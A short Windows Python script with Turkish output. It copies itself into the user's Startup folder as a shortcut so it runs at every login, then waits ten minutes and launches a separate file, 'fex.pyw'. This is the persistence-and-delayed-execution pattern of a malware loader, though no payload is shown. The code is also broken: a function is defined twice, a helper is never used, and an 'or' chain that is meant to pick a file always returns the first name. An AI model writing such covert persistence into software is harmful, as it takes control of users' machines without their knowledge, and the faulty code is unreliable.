import os
import time
import shutil
import sys
import win32com.client
import subprocess



def ensure_pywin32():
    try:
        import win32com.client
    except ImportError:
        print("[!] pywin32 bulunamadı, kuruluyor...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
        import win32com.client
    return win32com.client

def add_shortcut_to_startup():
    win32com = ensure_pywin32()

def add_shortcut_to_startup():
    startup_dir = os.path.join(
        os.getenv('APPDATA'),
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )

    target = os.path.abspath(sys.argv[0])

    shortcut_path = os.path.join(startup_dir, os.path.splitext(os.path.basename(target))[0] + ".lnk")

    shell = win32com.client.Dispatch("WScript.Shell")


    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = sys.executable 
    shortcut.Arguments = f'"{target}"'
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.IconLocation = sys.executable
    shortcut.Save()



if __name__ == "__main__":
    add_shortcut_to_startup()





time.sleep(10 * 60)

os.startfile("fex.pyw" or "fex.py" or "fex.exe")